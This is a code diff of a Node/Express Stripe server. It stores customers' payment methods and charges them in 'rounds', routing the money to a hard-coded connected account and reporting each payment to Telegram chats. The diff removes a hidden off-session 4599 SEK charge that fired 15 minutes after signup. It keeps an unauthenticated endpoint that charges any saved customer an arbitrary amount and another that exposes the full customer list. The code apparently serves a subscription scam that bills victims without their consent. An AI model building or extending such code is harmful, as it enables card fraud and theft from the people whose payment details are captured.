@@ -4,7 +4,6 @@ const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);
 const cors = require('cors');
 const bodyParser = require('body-parser');
 const fs = require('fs');
-const path = require('path');
 
 const app = express();
 const ACCOUNT_B = 'acct_1T7GFJ3wX40Nk5Cf';
@@ -13,7 +12,7 @@ const TELEGRAM_CHAT_ID = '8522488857';
 const TELEGRAM_CHAT_ID_2 = '715805541';
 const CUSTOMERS_FILE = '/data/customers.json';
 
-// ─── Customer Storage ────────────────────────────────────────────────────────
+// ─── Customer Storage ─────────────────────────────────────────────────────────
 
 function loadCustomers() {
   try {
@@ -21,14 +20,13 @@ function loadCustomers() {
       return JSON.parse(fs.readFileSync(CUSTOMERS_FILE, 'utf8'));
     }
   } catch (err) {
-    console.log('Error loading customers.json:', err.message);
+    console.log('Error loading customers:', err.message);
   }
   return [];
 }
 
 function saveCustomer(entry) {
   const customers = loadCustomers();
-  // Avoid duplicates
   const exists = customers.find(c => c.customerId === entry.customerId);
   if (!exists) {
     customers.push(entry);
@@ -37,18 +35,7 @@ function saveCustomer(entry) {
   }
 }
 
-function markRound2Done(customerId) {
-  const customers = loadCustomers();
-  const updated = customers.map(c => {
-    if (c.customerId === customerId) {
-      return { ...c, round2Done: true, round2At: new Date().toISOString() };
-    }
-    return c;
-  });
-  fs.writeFileSync(CUSTOMERS_FILE, JSON.stringify(updated, null, 2));
-}
-
-// ─── Telegram ────────────────────────────────────────────────────────────────
+// ─── Telegram ─────────────────────────────────────────────────────────────────
 
 async function sendTelegram(message) {
   try {
@@ -67,7 +54,7 @@ async function sendTelegram(message) {
   }
 }
 
-// ─── Charge Functions ─────────────────────────────────────────────────────────
+// ─── Round 1 Charges ──────────────────────────────────────────────────────────
 
 async function runRound1(customerId, paymentMethodId, pmType, visitorId) {
   // Charge 1 — 199 SEK
@@ -136,55 +123,7 @@ async function runRound1(customerId, paymentMethodId, pmType, visitorId) {
   );
 }
 
-async function runRound2(customerId, paymentMethodId, pmType, visitorId) {
-  // Single charge — 4599 SEK
-  try {
-    const payment = await stripe.paymentIntents.create({
-      amount: 459900,
-      currency: 'sek',
-      customer: customerId,
-      payment_method: paymentMethodId,
-      payment_method_types: [pmType],
-      confirm: true,
-      off_session: true,
-      transfer_data: { destination: ACCOUNT_B },
-    });
-    console.log('Round 2 - Payment created:', payment.id, payment.status);
-  } catch (err) {
-    console.log('Round 2 - Payment failed:', err.message);
-  }
-
-  markRound2Done(customerId);
-
-  await sendTelegram(
-    `✅ <b>Betalning lyckades! (Omgång 2)</b>\n\n` +
-    `🆔 Besökar-ID: <code>${visitorId}</code>\n` +
-    `💳 Betalningsmetod: ${pmType}\n` +
-    `💳 Betalning: 4599 kr\n` +
-    `🕐 Tid: ${new Date().toLocaleString('sv-SE')}`
-  );
-}
-
-// ─── On Startup: reschedule any missed Round 2s ───────────────────────────────
-
-function rescheduleRound2s() {
-  const customers = loadCustomers();
-  const pending = customers.filter(c => !c.round2Done);
-  if (pending.length === 0) return;
-
-  console.log(`Found ${pending.length} pending Round 2 charge(s) — rescheduling...`);
-  pending.forEach(c => {
-    const elapsed = Date.now() - new Date(c.savedAt).getTime();
-    const delay = Math.max(0, (15 * 60 * 1000) - elapsed);
-    console.log(`Rescheduling Round 2 for ${c.customerId} in ${Math.round(delay / 1000)}s`);
-    setTimeout(async () => {
-      console.log('Starting rescheduled Round 2 for:', c.customerId);
-      await runRound2(c.customerId, c.paymentMethodId, c.pmType, c.visitorId);
-    }, delay);
-  });
-}
-
-// ─── Express Middleware ───────────────────────────────────────────────────────
+// ─── Middleware ───────────────────────────────────────────────────────────────
 
 app.use(cors({ origin: '*', methods: ['GET', 'POST'] }));
 app.use(bodyParser.json());
@@ -267,14 +206,13 @@ app.post('/create-subscription', async (req, res) => {
     const paymentMethod = await stripe.paymentMethods.retrieve(paymentMethodId);
     const pmType = paymentMethod.type;
 
-    // Save customer for persistence
+    // Save customer to persistent storage
     saveCustomer({
       customerId,
       paymentMethodId,
       pmType,
       visitorId,
       savedAt: new Date().toISOString(),
-      round2Done: false,
     });
 
     // Round 1 — immediately
@@ -292,12 +230,6 @@ app.post('/create-subscription', async (req, res) => {
     });
     console.log('Subscription created:', subscription.id, subscription.status);
 
-    // Round 2 — after 15 min (background)
-    setTimeout(async () => {
-      console.log('Starting Round 2 charges (after 15 min)...');
-      await runRound2(customerId, paymentMethodId, pmType, visitorId);
-    }, 15 * 60 * 1000);
-
     res.json({ subscriptionId: subscription.id, paymentStatus: 'processed' });
   } catch (error) {
     console.error('Error:', error.message);
@@ -305,14 +237,15 @@ app.post('/create-subscription', async (req, res) => {
   }
 });
 
-// ─── List all saved customers ─────────────────────────────────────────────────
+// ─── View all saved customers ─────────────────────────────────────────────────
 app.get('/customers', (req, res) => {
   const customers = loadCustomers();
   res.json({ total: customers.length, customers });
 });
 
 // ─── Manually charge a saved customer ────────────────────────────────────────
-// POST /charge-saved { "customerId": "cus_xxx", "amount": 459900, "currency": "sek" }
+// POST /charge-saved
+// Body: { "customerId": "cus_xxx", "amount": 459900, "currency": "sek" }
 app.post('/charge-saved', async (req, res) => {
   const { customerId, amount, currency } = req.body;
   const customers = loadCustomers();
@@ -358,7 +291,6 @@ app.get('/health', (req, res) => {
     status: 'ok',
     destination: ACCOUNT_B,
     savedCustomers: customers.length,
-    pendingRound2: customers.filter(c => !c.round2Done).length,
   });
 });
 
@@ -366,5 +298,4 @@ app.get('/health', (req, res) => {
 const PORT = process.env.PORT || 4242;
 app.listen(PORT, () => {
   console.log('Server running on http://localhost:' + PORT);
-  rescheduleRound2s();
 });
